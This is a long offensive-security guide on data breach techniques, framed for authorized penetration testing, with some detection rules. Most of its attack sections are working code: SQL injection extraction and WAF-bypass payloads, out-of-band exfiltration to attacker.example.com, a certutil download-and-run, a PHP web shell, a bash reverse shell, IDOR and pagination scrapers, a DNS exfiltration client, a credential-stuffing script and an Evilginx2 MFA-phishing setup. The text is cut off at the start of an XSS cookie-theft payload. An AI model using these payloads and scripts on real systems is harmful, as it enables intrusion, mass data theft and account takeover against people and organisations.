# Data Breach Attack Vectors — Techniques, Tools, and Case Studies

Version: 2026-05-07
Audience: Senior IT professionals, penetration testers, ethical hackers, SOC analysts
Scope: Offensive techniques for authorized engagements, defensive monitoring, detection engineering

---

## Table of Contents

1. [Data Breach Taxonomy](#1-data-breach-taxonomy)
2. [SQL Injection for Data Exfiltration](#2-sql-injection-for-data-exfiltration)
3. [Application-Level Data Theft](#3-application-level-data-theft)
4. [Network-Based Data Exfiltration](#4-network-based-data-exfiltration)
5. [Credential-Based Breaches](#5-credential-based-breaches)
6. [Insider Data Theft](#6-insider-data-theft)
7. [Cloud Data Breaches](#7-cloud-data-breaches)
8. [Database-Specific Attack Techniques](#8-database-specific-attack-techniques)
9. [Data Exfiltration Techniques](#9-data-exfiltration-techniques)
10. [Defense and Detection](#10-defense-and-detection)

---

## 1. Data Breach Taxonomy

### 1.1 Definitions: Breach vs. Leak vs. Exposure

These three terms are frequently conflated. They describe distinct events with different legal, technical, and operational implications.

**Data Breach**: An incident where an unauthorized party gains access to confidential data through deliberate action. A breach implies adversarial intent — someone exploited a vulnerability, stole credentials, or otherwise circumvented access controls. The 2017 Equifax breach (CVE-2017-5638) exemplifies this: attackers exploited an Apache Struts vulnerability, gained remote code execution, pivoted internally, and exfiltrated 147.9 million records over 76 days.

**Data Leak**: Unauthorized transmission of data from within an organization to an external destination, typically by an insider — whether malicious or negligent. The 2010 WikiLeaks / Chelsea Manning incident is the canonical example: an authorized insider copied classified material to removable media and transmitted it to a third party. The distinction from a breach is that the initial access was authorized; the exfiltration was not.

**Data Exposure**: Data made accessible without proper controls, but not necessarily accessed by any unauthorized party. A publicly accessible S3 bucket containing customer PII is an exposure. It becomes a breach only when evidence shows unauthorized access occurred. The 2019 Capital One incident blurred this line — it began as exposure (misconfigured WAF) but became a breach when Paige Thompson exploited it.

The legal distinction matters for notification obligations. Under GDPR Article 33, a "personal data breach" requires notification to the supervisory authority within 72 hours. A mere exposure without evidence of unauthorized access may not trigger notification, but most organizations err on the side of disclosure.

### 1.2 Breach Vectors

Breach vectors fall into four primary categories:

**External Attacks** account for approximately 65% of breaches (Verizon DBIR 2025). These include exploitation of public-facing applications, brute force attacks, social engineering, supply-chain compromise, and zero-day exploitation. The attack surface has expanded significantly with cloud adoption: exposed APIs, misconfigured cloud services, and SaaS integrations provide additional entry points.

**Insider Threats** comprise roughly 20% of breaches. These split further into:
- *Malicious insiders*: employees, contractors, or partners who deliberately steal data for financial gain, espionage, or revenge.
- *Negligent insiders*: personnel who unintentionally cause breaches through misconfiguration, mishandling of data, or falling for social engineering.
- *Compromised insiders*: legitimate accounts taken over by external attackers via credential theft or malware.

**Third-Party / Supply Chain** vectors represent approximately 10% of breaches and are growing. The 2020 SolarWinds attack compromised 18,000 organizations through a single supply chain insertion. The 2023 MOVEit Transfer exploitation (CVE-2023-34362) by the Cl0p ransomware group affected over 2,500 organizations and 67 million individuals through a single file transfer application vulnerability.

**Accidental Exposure** covers the remaining ~5%: misconfigured databases, accidental email disclosures, lost devices, and publishing sensitive data in public repositories.

### 1.3 Data Types Targeted

| Data Category | Description | Regulatory Framework | Underground Value (per record, 2025) |
|---|---|---|---|
| PII (Personally Identifiable Information) | Name, SSN, DOB, address, phone | GDPR, CCPA, state breach laws | $1–$10 |
| PHI (Protected Health Information) | Medical records, insurance data, diagnoses | HIPAA, HITECH | $50–$250 |
| PCI (Payment Card Industry) | Credit card numbers, CVV, cardholder data | PCI DSS | $5–$45 |
| Intellectual Property | Source code, trade secrets, R&D data | Trade secret law, NDA | Highly variable; can exceed $1M |
| Credentials | Username/password pairs, API keys, tokens | Various | $0.50–$5 per combo; privileged creds far more |
| Government / Classified | Intelligence, military, diplomatic | Classification frameworks | State-sponsored; no market price |

PHI commands the highest per-record value because medical records are rich in identity data (enabling identity theft), have long shelf life (medical conditions don't change), and victims are slow to detect misuse.

### 1.4 Breach Timeline Analysis

The breach timeline consists of four critical phases:

**Dwell Time** (time from initial compromise to detection): The mean dwell time has decreased from 207 days in 2018 to approximately 73 days in 2025, driven by improved EDR, SIEM, and threat intelligence sharing. However, this average masks extreme variance: state-sponsored APTs routinely maintain access for 200+ days, while ransomware operators increasingly have dwell times under 5 days (they encrypt and announce quickly).

**Detection**: Most breaches (67%) are still detected by external parties — law enforcement notifications, fraud detection systems, or public disclosure on dark web forums. Organizations with mature SOCs, threat hunting programs, and robust logging detect breaches faster. The deployment of XDR platforms and automated threat detection has compressed detection time for commodity attacks while doing little to reduce dwell time for sophisticated operations.

**Containment**: Mean time from detection to containment averages 73 days (IBM 2025). Complex environments with hybrid cloud, legacy systems, and incomplete asset inventories take longer. Organizations that rehearse incident response through tabletop exercises contain breaches approximately 40% faster.

**Notification**: Regulatory timelines vary — GDPR mandates 72 hours, US state laws range from 30 to 90 days, HIPAA requires 60 days. The SEC's 2023 cybersecurity disclosure rules require publicly traded companies to report material incidents within four business days.

### 1.5 Cost of Data Breaches

Based on the IBM Cost of a Data Breach Report (2025):

| Metric | Value |
|---|---|
| Global average cost per breach | $4.88M |
| Average cost per record | $169 |
| Healthcare industry average | $10.93M |
| Financial services average | $6.08M |
| Mean time to identify | 194 days |
| Mean time to contain | 73 days |
| Cost savings with AI/automation | $2.22M reduction |
| Cost savings with IR team + testing | $2.66M reduction |
| Mega-breach (50M+ records) average | $375M+ |

The three largest cost amplifiers are: (1) non-compliance with regulations, (2) security system complexity (too many disconnected tools), and (3) cloud migration (breaches during or shortly after migration cost more). The three largest cost mitigators are: (1) AI-driven security operations, (2) DevSecOps integration, and (3) employee security awareness training.

---

## 2. SQL Injection for Data Exfiltration

SQL injection remains the most direct path from web application vulnerability to database exfiltration. Despite decades of awareness, it persists due to legacy codebases, ORM misuse, dynamic query construction, and insufficient input validation at system boundaries.

### 2.1 UNION-Based Extraction

UNION-based SQLi is the fastest extraction method when the application renders query results in the HTTP response. The attacker appends a `UNION SELECT` to the original query, injecting controlled output.

**Step 1: Determine column count**

```sql
-- ORDER BY method (increment until error)
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
-- When ORDER BY N causes an error, there are N-1 columns.

-- NULL method
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
-- When the query succeeds, you have the right column count.
```

**Step 2: Identify string-compatible columns**

```sql
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -
-- The column that renders 'a' in the response accepts strings.
```

**Step 3: Enumerate database metadata**

```sql
-- MySQL: enumerate all databases
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata-- -

-- MySQL: enumerate tables in target database
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='target_db'-- -

-- MySQL: enumerate columns in target table
' UNION SELECT column_name,data_type,NULL FROM information_schema.columns
  WHERE table_schema='target_db' AND table_name='users'-- -
```

**Step 4: Extract data**

```sql
-- Dump credentials
' UNION SELECT username,password,email FROM target_db.users-- -

-- Concatenate multiple columns into one (when only one column is visible)
' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL,NULL
  FROM target_db.users-- -
```

**PostgreSQL equivalent:**

```sql
-- Enumerate tables
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables
  WHERE table_schema='public'-- -

-- Extract data
' UNION SELECT username||':'||password,NULL,NULL FROM users-- -

-- Use string_agg for grouping
' UNION SELECT string_agg(username||':'||password, E'\n'),NULL,NULL FROM users-- -
```

**MSSQL equivalent:**

```sql
-- Enumerate databases
' UNION SELECT name,NULL,NULL FROM master..sysdatabases-- -

-- Enumerate tables
' UNION SELECT name,NULL,NULL FROM target_db..sysobjects WHERE xtype='U'-- -

-- Extract data with FOR XML PATH for concatenation
' UNION SELECT (SELECT username+':'+password+CHAR(10) FROM users FOR XML PATH('')),NULL,NULL-- -
```

### 2.2 Blind SQLi Data Extraction

When the application does not render query results — returning only true/false responses or timing differences — blind extraction is required.

**Boolean-based blind extraction:**

```sql
-- Test: is the first character of the admin password 'a'?
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- -

-- Binary search approach (more efficient)
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 77-- -
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 102-- -
-- Narrow down character-by-character using binary search on ASCII range.
```

**Python script for boolean-based blind extraction:**

```python
#!/usr/bin/env python3
"""Boolean-based blind SQL injection extractor.
For AUTHORIZED penetration testing engagements only."""

import requests
import string
import sys

TARGET = "https://target.example.com/search"
CHARSET = string.printable
TRUE_INDICATOR = "Results found"  # Response text indicating TRUE condition

def extract_char(position: int, query_template: str) -> str:
    low, high = 32, 126  # Printable ASCII range
    while low <= high:
        mid = (low + high) // 2
        payload = query_template.format(pos=position, val=mid)
        response = requests.get(TARGET, params={"q": payload}, timeout=10)
        if TRUE_INDICATOR in response.text:
            low = mid + 1
        else:
            high = mid - 1
    return chr(low) if 32 <= low <= 126 else ""

def extract_string(query_template: str, max_length: int = 256) -> str:
    result = []
    for pos in range(1, max_length + 1):
        char = extract_char(pos, query_template)
        if not char or char == " ":
            break
        result.append(char)
        sys.stdout.write(char)
        sys.stdout.flush()
    return "".join(result)

if __name__ == "__main__":
    # Extract admin password hash character by character
    template = (
        "' AND (SELECT ASCII(SUBSTRING(password,{pos},1)) "
        "FROM users WHERE username='admin') > {val}-- -"
    )
    password = extract_string(template)
    print(f"\n[+] Extracted: {password}")
```

**Time-based blind extraction:**

```sql
-- MySQL: if condition is true, sleep 5 seconds
' AND IF(
    (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',
    SLEEP(5),
    0
)-- -

-- PostgreSQL
'; SELECT CASE WHEN
    (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'
    THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

-- MSSQL
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'
    WAITFOR DELAY '0:0:5'-- -
```

### 2.3 Out-of-Band SQLi

When neither in-band nor blind techniques work (e.g., asynchronous query execution, no visible response differences), out-of-band channels extract data via DNS or HTTP requests initiated by the database server.

**DNS exfiltration (MSSQL):**

```sql
-- Uses xp_dirtree to force a DNS lookup containing extracted data
'; DECLARE @d VARCHAR(1024);
  SELECT @d = (SELECT TOP 1 password FROM users WHERE username='admin');
  EXEC master..xp_dirtree '\\' + @d + '.attacker.example.com\share'-- -
```

**DNS exfiltration (MySQL — requires FILE privilege):**

```sql
-- Linux: use LOAD_FILE with DNS
' UNION SELECT LOAD_FILE(
    CONCAT('\\\\',
        (SELECT password FROM users WHERE username='admin' LIMIT 1),
        '.attacker.example.com\\share')
),NULL,NULL-- -
```

**HTTP exfiltration (Oracle):**

```sql
-- UTL_HTTP.REQUEST makes an HTTP request containing data
' UNION SELECT UTL_HTTP.REQUEST(
    'http://attacker.example.com/exfil?d=' ||
    (SELECT password FROM users WHERE username='admin' AND ROWNUM=1)
) FROM dual-- -
```

**DNS exfiltration (PostgreSQL via dblink or COPY):**

```sql
-- Using dblink extension
SELECT dblink_connect('host=data.' ||
    (SELECT password FROM users LIMIT 1) ||
    '.attacker.example.com dbname=x');
```

To capture OOB data, the attacker runs a DNS listener (such as a custom authoritative DNS server for `attacker.example.com`) or an HTTP listener:

```bash
# Simple HTTP listener to capture exfiltrated data
python3 -m http.server 8443 --bind 0.0.0.0 2>&1 | tee exfil.log
```

### 2.4 SQLi to Shell

Escalating from SQLi to operating system command execution.

**MSSQL — xp_cmdshell:**

```sql
-- Enable xp_cmdshell (requires sysadmin role)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -

-- Execute OS command
'; EXEC xp_cmdshell 'whoami > C:\temp\whoami.txt';-- -

-- Download and execute payload
'; EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.example.com/shell.exe C:\temp\shell.exe && C:\temp\shell.exe';-- -
```

**MySQL — INTO OUTFILE (write web shell):**

```sql
-- Write a PHP web shell (requires FILE privilege and known web root)
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -

-- Read arbitrary files
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -
```

**PostgreSQL — COPY TO:**

```sql
-- Write to file (requires superuser or pg_write_server_files role)
COPY (SELECT '#!/bin/bash' || chr(10) || 'bash -i >& /dev/tcp/attacker.example.com/4444 0>&1')
  TO '/tmp/revshell.sh';

-- Using large objects for file write
SELECT lo_create(31337);
INSERT INTO pg_largeobject (loid, pageno, data)
  VALUES (31337, 0, decode('...hex_payload...', 'hex'));
SELECT lo_export(31337, '/tmp/payload.so');
```

### 2.5 Database-Specific Techniques

**Oracle-specific:**

```sql
-- Extract version
' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1-- -

-- Enumerate tables owned by current user
' UNION SELECT table_name,NULL FROM user_tables-- -

-- Privilege escalation via DBMS_JAVA (if Java is installed)
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c "id"') FROM dual;
```

**MSSQL-specific linked server exploitation:**

```sql
-- Enumerate linked servers
'; SELECT name FROM master..sysservers;-- -

-- Query a linked server (lateral movement to other databases)
'; SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT username, password FROM users');-- -

-- Execute commands on linked server
'; EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];-- -
```

### 2.6 Bypassing WAF

Web application firewalls attempt to block SQLi via signature matching. Bypass techniques exploit parser differentials between the WAF and the database.

**Encoding-based bypasses:**

```sql
-- URL encoding
%27%20UNION%20SELECT%20%2A%20FROM%20users%20--%20-

-- Double URL encoding
%2527%2520UNION%2520SELECT%2520%252A%2520FROM%2520users

-- Unicode/UTF-8 encoding
%c0%27 UNION SELECT * FROM users-- -

-- Hex encoding for strings (MySQL)
' UNION SELECT * FROM users WHERE username=0x61646d696e-- -
```

**Comment-based obfuscation:**

```sql
-- Inline comments (MySQL-specific syntax parsed by MySQL but ignored by WAF)
/*!50000UNION*/ /*!50000SELECT*/ * FROM users-- -

-- Comment splitting
UN/**/ION SE/**/LECT * FR/**/OM users-- -

-- Newline injection
' UNION%0aSELECT%0a*%0aFROM%0ausers-- -
```

**Alternative syntax:**

```sql
-- Using LIKE instead of =
' AND password LIKE 'a%'-- -

-- Using BETWEEN for character extraction
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users LIMIT 1) BETWEEN 97 AND 122-- -

-- JSON functions in MySQL 5.7+
' UNION SELECT JSON_EXTRACT('{"a":"test"}','$.a'),NULL-- -

-- Replacing spaces with tabs, newlines, or /**/ comments
'%09UNION%09SELECT%09*%09FROM%09users--%09-
```

**Case variation and function substitution:**

```sql
-- Mixed case
' uNiOn SeLeCt * fRoM users-- -

-- Function alternatives for string extraction
MID(password,1,1)        -- instead of SUBSTRING
LEFT(password,1)         -- first character
REVERSE(RIGHT(REVERSE(password),1))  -- obfuscated first char
```

---

## 3. Application-Level Data Theft

### 3.1 IDOR for Mass Data Access

Insecure Direct Object Reference (IDOR) occurs when applications expose internal object identifiers (database IDs, filenames, GUIDs) in URLs, API requests, or form parameters without enforcing authorization checks.

**Sequential integer enumeration:**

```python
#!/usr/bin/env python3
"""IDOR enumeration for sequential IDs.
Authorized testing only."""

import requests
import json
from pathlib import Path

SESSION_COOKIE = "session=eyJhbGciOi..."
TARGET = "https://target.example.com/api/v1/users/{user_id}/profile"
OUTPUT = Path("exfiltrated_profiles.jsonl")

def enumerate_idor(start: int, end: int) -> None:
    headers = {"Cookie": SESSION_COOKIE}
    with OUTPUT.open("a") as f:
        for uid in range(start, end + 1):
            url = TARGET.format(user_id=uid)
            resp = requests.get(url, headers=headers, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                f.write(json.dumps(data) + "\n")
                print(f"[+] User {uid}: {data.get('email', 'N/A')}")
            elif resp.status_code == 403:
                print(f"[-] User {uid}: Access denied (authz check exists)")
                return  # Authorization is enforced; stop.
            elif resp.status_code == 404:
                pass  # User doesn't exist; continue.

if __name__ == "__main__":
    enumerate_idor(1, 10000)
```

**UUID enumeration**: UUIDs (v4) are not enumerable by brute force. However:
- UUIDs may leak in API responses (listing endpoints, error messages, logs).
- UUIDv1 is time-based and partially predictable.
- Applications may use short UUIDs or sequential UUIDv7, which are enumerable.

**Detection — Sigma rule for IDOR scanning:**

```yaml
title: Rapid Sequential API Resource Access (IDOR Scan)
id: b7c3a1e0-5f2d-4e8a-9c1b-3d7e6f8a2b4c
status: experimental
description: Detects rapid sequential access to user profile endpoints, indicating IDOR enumeration
logsource:
    category: webserver
    product: any
detection:
    selection:
        cs-uri-stem|re: '/api/v[0-9]+/users/[0-9]+/profile'
        sc-status: 200
    timeframe: 1m
    condition: selection | count(cs-uri-stem) by c-ip > 50
level: high
tags:
    - attack.collection
    - attack.t1530
```

### 3.2 GraphQL Introspection to Data Extraction

GraphQL's introspection feature reveals the complete schema — every type, field, argument, and relationship — unless explicitly disabled.

**Introspection query:**

```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
          ofType { name kind }
        }
      }
    }
  }
}
```

**Extracting sensitive data after discovering schema:**

```graphql
# After discovering a 'users' type with fields: id, email, ssn, password_hash
{
  users(first: 10000) {
    edges {
      node {
        id
        email
        ssn
        passwordHash
      }
    }
  }
}
```

**Automated GraphQL exfiltration script:**

```python
#!/usr/bin/env python3
"""GraphQL schema discovery and data extraction.
Authorized testing only."""

import requests
import json

TARGET = "https://target.example.com/graphql"
HEADERS = {"Content-Type": "application/json", "Authorization": "Bearer <token>"}

INTROSPECTION_QUERY = """
{
  __schema {
    queryType { name }
    types {
      name
      kind
      fields {
        name
        args { name type { name } }
        type { name kind ofType { name kind } }
      }
    }
  }
}
"""

def introspect() -> dict:
    resp = requests.post(TARGET, json={"query": INTROSPECTION_QUERY},
                         headers=HEADERS, timeout=15)
    resp.raise_for_status()
    return resp.json()["data"]["__schema"]

def find_sensitive_types(schema: dict) -> list[dict]:
    sensitive_keywords = {"user", "customer", "patient", "payment", "credential",
                          "secret", "ssn", "password", "token", "card"}
    results = []
    for t in schema["types"]:
        if t["kind"] == "OBJECT" and not t["name"].startswith("__"):
            for field in (t["fields"] or []):
                if any(kw in field["name"].lower() for kw in sensitive_keywords):
                    results.append({"type": t["name"], "field": field["name"]})
    return results

if __name__ == "__main__":
    schema = introspect()
    sensitive = find_sensitive_types(schema)
    print(f"[+] Found {len(sensitive)} potentially sensitive fields:")
    for s in sensitive:
        print(f"    {s['type']}.{s['field']}")
```

### 3.3 API Pagination Exploitation

APIs that implement pagination without authorization scoping allow authenticated users to enumerate all records.

```python
#!/usr/bin/env python3
"""API pagination exhaustion — extracting all records through paginated endpoints."""

import requests
import json

TARGET = "https://target.example.com/api/v2/customers"
HEADERS = {"Authorization": "Bearer <low-priv-token>"}
PAGE_SIZE = 100

def exhaust_pagination() -> list[dict]:
    all_records = []
    page = 0
    while True:
        params = {"page": page, "size": PAGE_SIZE}
        resp = requests.get(TARGET, params=params, headers=HEADERS, timeout=15)
        if resp.status_code != 200:
            break
        data = resp.json()
        records = data.get("data", data.get("results", []))
        if not records:
            break
        all_records.extend(records)
        print(f"[+] Page {page}: {len(records)} records (total: {len(all_records)})")
        page += 1
    return all_records

if __name__ == "__main__":
    records = exhaust_pagination()
    with open("all_customers.json", "w") as f:
        json.dump(records, f, indent=2)
    print(f"[+] Total records extracted: {len(records)}")
```

### 3.4 Broken Access Control — Privilege Escalation to Data

**Horizontal privilege escalation**: accessing another user's data at the same privilege level. Typically via parameter manipulation:

```http
GET /api/v1/invoices?user_id=1337 HTTP/1.1
Authorization: Bearer <token_for_user_42>
```

If the server does not verify that the requesting user owns user_id 1337, all invoices for user 1337 are returned.

**Vertical privilege escalation**: escalating to administrator-level data access:

```http
-- Modifying role claim in JWT (if signature is not verified or uses none algorithm)
-- Original JWT payload: {"user_id": 42, "role": "user"}
-- Tampered: {"user_id": 42, "role": "admin"}

-- Direct access to admin endpoints
GET /api/admin/users/export HTTP/1.1
Authorization: Bearer <regular_user_token>
```

### 3.5 Export Functionality Abuse

Applications that offer export functionality (CSV, PDF, Excel reports) often apply insufficient authorization to the export query, or generate exports server-side from an elevated service account.

Common exploitation patterns:
- Modifying export parameters to include all records: `GET /export/report?filter=all&format=csv`
- Parameter injection in report generation: adding SQL/filter operators that bypass intended scope
- Race conditions: requesting export before access revocation takes effect
- Large export requests causing DoS as a side effect

### 3.6 Search Functionality Exploitation

Search features can be weaponized for data extraction when they return richer data than intended or when wildcard/regex patterns are accepted.

```
# Extracting email addresses character by character via search
GET /api/search?q=email:a*          → 1,234 results
GET /api/search?q=email:ab*         → 156 results
GET /api/search?q=email:abc*        → 12 results
# Continue narrowing until individual records are identified
```

Elasticsearch-backed search endpoints are particularly vulnerable when they expose the full Elasticsearch query DSL to the user, allowing `_source` field selection and aggregation queries that enumerate data.

---

## 4. Network-Based Data Exfiltration

### 4.1 Man-in-the-Middle (MITM)

MITM attacks intercept data in transit between endpoints. Modern TLS adoption has reduced the attack surface, but opportunities persist in internal networks, legacy systems, and misconfigured environments.

**ARP spoofing for MITM positioning (using arpspoof):**

```bash
# Enable IP forwarding to avoid disrupting traffic flow
echo 1 > /proc/sys/net/ipv4/ip_forward

# Poison ARP cache of target (10.0.0.50) — impersonate the gateway (10.0.0.1)
arpspoof -i eth0 -t 10.0.0.50 10.0.0.1

# Poison ARP cache of gateway — impersonate the target (in another terminal)
arpspoof -i eth0 -t 10.0.0.1 10.0.0.50
```

**Bettercap for combined MITM + sniffing:**

```bash
# Start bettercap
bettercap -iface eth0

# ARP spoofing + HTTP proxy + credential capture
> set arp.spoof.targets 10.0.0.50
> arp.spoof on
> set net.sniff.local true
> net.sniff on
```

### 4.2 Packet Sniffing in Shared Networks

On broadcast or improperly segmented networks, passive sniffing captures all traffic without active poisoning.

```bash
# Capture HTTP credentials from a shared network
tcpdump -i eth0 -A -s0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' | grep -i 'user\|pass\|login\|token'

# Capture FTP credentials
tcpdump -i eth0 -nn 'tcp port 21' -A | grep -E 'USER|PASS'

# Full packet capture for offline analysis
tcpdump -i eth0 -w capture.pcap -c 100000
```

**Suricata rule for detecting ARP spoofing:**

```yaml
alert arp any any -> any any (msg:"ARP Spoofing Detected - Duplicate IP with Different MAC";
    arp.opcode:2;
    threshold: type both, track by_src, count 5, seconds 60;
    sid:2100001; rev:1;)
```

### 4.3 SSL Stripping

SSL stripping downgrades HTTPS connections to HTTP by intercepting the initial unencrypted request and proxying to the legitimate server over HTTPS.

```bash
# Using sslstrip with arpspoof
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sslstrip -l 8080

# Using bettercap's hstshijack module
> set hstshijack.log /tmp/hsts.log
> set hstshijack.payloads *:/path/to/inject.js
> set hstshijack.targets example.com,bank.example.com
> set hstshijack.replacements example.org,bank.example.org
> hstshijack on
```

HSTS (HTTP Strict Transport Security) with preloading mitigates SSL stripping. However, first-visit scenarios and subdomains not covered by the HSTS policy remain vulnerable.

### 4.4 DNS Exfiltration

DNS is allowed through nearly all firewalls, making it an ideal covert exfiltration channel. Data is encoded into DNS query labels (max 63 bytes per label, 253 bytes total per FQDN).

**Python DNS exfiltration client:**

```python
#!/usr/bin/env python3
"""DNS exfiltration client — encodes data into DNS queries.
Requires authoritative DNS control of attacker.example.com.
Authorized engagements only."""

import base64
import socket
import struct
import time

EXFIL_DOMAIN = "exfil.attacker.example.com"
DNS_SERVER = "8.8.8.8"  # Queries will recurse to attacker's authoritative NS
CHUNK_SIZE = 60  # Max label length minus overhead

def dns_query(subdomain: str, domain: str) -> None:
    """Send a DNS A query for subdomain.domain."""
    fqdn = f"{subdomain}.{domain}"
    try:
        socket.getaddrinfo(fqdn, None)
    except socket.gaierror:
        pass  # Expected — the domain won't resolve; the query IS the exfil.

def exfiltrate(data: bytes) -> None:
    encoded = base64.b32encode(data).decode().rstrip("=").lower()
    chunks = [encoded[i:i+CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
    total = len(chunks)
    for idx, chunk in enumerate(chunks):
        label = f"{idx:04d}.{chunk}"
        dns_query(label, EXFIL_DOMAIN)
        time.sleep(0.1)  # Rate limiting to avoid detection
    dns_query(f"done.{total}", EXFIL_DOMAIN)

if __name__ == "__main__":
    import sys
    with open(sys.argv[1], "rb") as f:
        exfiltrate(f.read())
```

**Suricata rule for DNS exfiltration detection:**

```yaml
alert dns any any -> any any (msg:"Potential DNS Exfiltration - Long Subdomain";
    dns.query;
    content:".";
    pcre:"/^[a-z0-9]{40,}\./i";
    threshold: type both, track by_src, count 10, seconds 60;
    sid:2100010; rev:1;)

alert dns any any -> any any (msg:"Potential DNS Exfiltration - High Query Volume to Single Domain";
    dns.query;
    threshold: type both, track by_src, count 100, seconds 300;
    sid:2100011; rev:1;)
```

### 4.5 ICMP Tunneling

ICMP echo requests and replies carry a data payload that can encode exfiltrated data. Since ICMP is often allowed for diagnostics (ping), it provides a covert channel.

```bash
# Using ptunnel-ng for ICMP tunneling
# Server side (on attacker infrastructure):
ptunnel-ng -r<proxy_address> -R22

# Client side (on compromised host):
ptunnel-ng -p<proxy_address> -l2222 -r<destination> -R22
ssh -p2222 -l user 127.0.0.1
```

**Detection — Suricata rule for ICMP tunneling:**

```yaml
alert icmp any any -> any any (msg:"ICMP Tunnel Detected - Oversized Payload";
    dsize:>64;
    itype:8;
    threshold: type both, track by_src, count 20, seconds 60;
    sid:2100020; rev:1;)
```

### 4.6 Steganography in Network Protocols

Data can be hidden in protocol-compliant fields:
- **TCP/IP header fields**: unused bits, IP ID field, TCP urgent pointer, TCP timestamp options
- **HTTP headers**: custom headers, Cookie values, padding in Content-Length
- **TLS session tickets**: encrypted payloads embedded in session resumption data

### 4.7 Covert Channels in Allowed Traffic

- **HTTPS to legitimate services**: uploading exfiltrated data to cloud storage, paste sites, or code repositories via normal HTTPS — indistinguishable from legitimate traffic without SSL inspection
- **WebSocket tunneling**: establishing persistent WebSocket connections through proxies
- **DoH/DoT (DNS over HTTPS/TLS)**: encrypted DNS queries that bypass traditional DNS monitoring

---

## 5. Credential-Based Breaches

### 5.1 Credential Stuffing

Credential stuffing tests username/password pairs from previous breaches against target applications. The success rate is typically 0.1%–3%, but against large credential dumps (billions of pairs available), even 0.1% yields significant access.

**Python credential stuffing tool:**

```python
#!/usr/bin/env python3
"""Credential stuffing framework.
For authorized testing only — use against your own applications."""

import requests
import threading
from queue import Queue
from pathlib import Path

TARGET_LOGIN = "https://target.example.com/api/auth/login"
THREADS = 10
TIMEOUT = 10

def attempt_login(username: str, password: str) -> bool:
    payload = {"username": username, "password": password}
    try:
        resp = requests.post(TARGET_LOGIN, json=payload, timeout=TIMEOUT)
        if resp.status_code == 200 and "token" in resp.json():
            return True
    except requests.RequestException:
        pass
    return False

def worker(queue: Queue, results: list) -> None:
    while not queue.empty():
        username, password = queue.get()
        if attempt_login(username, password):
            results.append((username, password))
            print(f"[+] VALID: {username}:{password}")
        queue.task_done()

def run(credential_file: str) -> list:
    queue = Queue()
    results = []
    for line in Path(credential_file).read_text().splitlines():
        if ":" in line:
            user, pwd = line.split(":", 1)
            queue.put((user.strip(), pwd.strip()))

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker, args=(queue, results))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return results
```

**Countermeasures**: rate limiting per IP and per account, CAPTCHA after failed attempts, credential breach monitoring (Have I Been Pwned API), anomaly detection on login patterns.

### 5.2 Password Spraying

Password spraying tests a small set of common passwords against many accounts, staying below account lockout thresholds.

```bash
# Using Spray (Go-based tool) against Microsoft 365
spray -url https://login.microsoftonline.com -emails users.txt \
      -passwords "Summer2025!" -delay 1800 -attempts 1

# Using Ruler for Exchange
ruler --domain target.example.com brute --users users.txt \
      --passwords passwords.txt --delay 30 --attempts 1
```

Typical spray passwords: `Season+Year!` (Winter2025!), `CompanyName+123`, `Password1!`, `Welcome1!`.

Lockout-aware spraying: attempt one password per account, wait the lockout window (typically 30 minutes), then spray the next password.

### 5.3 Phishing for Credentials — Evilginx2

Evilginx2 is a man-in-the-middle phishing framework that proxies legitimate login pages, capturing not just credentials but also session cookies — bypassing MFA in real time.

```bash
# Evilginx2 setup (simplified)
# 1. Configure DNS: phishlet domain points to evilginx server
# 2. Set up phishlet for target service

# In evilginx2 console:
: config domain attacker.example.com
: config ipv4 203.0.113.50

# Set up Microsoft 365 phishlet
: phishlets hostname o365 login.attacker.example.com
: phishlets enable o365

# Create lure URL
: lures create o365
: lures get-url 0
# Output: https://login.attacker.example.com/XxXxXx
```

When the victim visits the lure URL, they see the real Microsoft login page proxied through evilginx2. After entering credentials and completing MFA, evilginx2 captures the session token. The attacker can then import this token into their browser and access the victim's account without re-authenticating.

**Sigma rule for detecting evilginx2-style phishing:**

```yaml
title: Login from Known Phishing Infrastructure IP
id: d4e5f6a7-8b9c-4d1e-2f3a-5b6c7d8e9f0a
status: experimental
description: Detects successful authentication from IP addresses associated with reverse proxy phishing infrastructure
logsource:
    product: azure
    service: signin
detection:
    selection:
        Status.errorCode: 0
        IPAddress|cidr:
            - '203.0.113.0/24'  # Known phishing infra
    condition: selection
level: critical
tags:
    - attack.credential_access
    - attack.t1557
```

### 5.4 Session Hijacking

**Cookie theft via XSS:**

```javascript
// Reflected/stored XSS payload to steal session cookie
<script>
